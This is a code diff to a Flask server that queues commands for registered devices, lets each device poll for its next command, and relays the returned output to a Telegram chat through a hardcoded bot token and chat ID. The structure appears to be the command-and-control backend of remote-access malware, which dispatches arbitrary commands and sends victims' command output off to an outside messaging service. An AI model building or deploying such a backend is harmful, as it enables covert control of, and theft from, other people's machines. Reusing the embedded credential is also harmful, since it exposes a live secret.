@@ -6,6 +6,7 @@ DEVICE_FILE = "devices.json"
 
 BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
 CHAT_ID = "7554840326"
+COMMAND_QUEUE = {}
 
 def load_devices():
     if os.path.exists(DEVICE_FILE):
@@ -57,7 +58,7 @@ def ping_device(device_id):
     if device_id not in devices:
         return abort(404)
     last_seen = devices[device_id].get("last_seen", 0)
-    if time.time() - last_seen <= 15:  # considered alive if seen within last 15s
+    if time.time() - last_seen <= 15:
         return jsonify({"status": "alive"}), 200
     else:
         return jsonify({"status": "offline"}), 503
@@ -78,10 +79,41 @@ def send_command():
     data = request.json
     device_id = data.get("device_id")
     command = data.get("command")
-    args = data.get("args")
-    print(f"[COMMAND] To: {device_id} | CMD: {command} | Args: {args}")
-    return jsonify({"status": "sent"}), 200
+    args = data.get("args", "")
+
+    if device_id:
+        COMMAND_QUEUE[device_id] = {
+            "command": command,
+            "args": args
+        }
+        print(f"[COMMAND] To {device_id}: {command} {args}")
+        return jsonify({"status": "sent"}), 200
+
+    return jsonify({"error": "Invalid request"}), 400
+
+@app.route("/get_command/<device_id>", methods=["GET"])
+def get_command(device_id):
+    if device_id not in COMMAND_QUEUE:
+        return jsonify({"command": None})
+    return jsonify(COMMAND_QUEUE.pop(device_id))
+
+@app.route("/result", methods=["POST"])
+def receive_result():
+    data = request.json
+    output = data.get("output")
+    device_id = data.get("device_id")
+
+    device_name = devices.get(device_id, {}).get("device_name", "Unknown")
+    message = f"🖥️ *{device_name}* (`{device_id}`)\n\n" + f"```{output.strip()[:4000]}```"
+
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
+        "chat_id": CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    })
+
+    return jsonify({"status": "received"}), 200
 
 if __name__ == "__main__":
-    print("Flask server running securely on port 10000...")
+    print("Flask server running on port 10000...")
     app.run(host="0.0.0.0", port=10000)
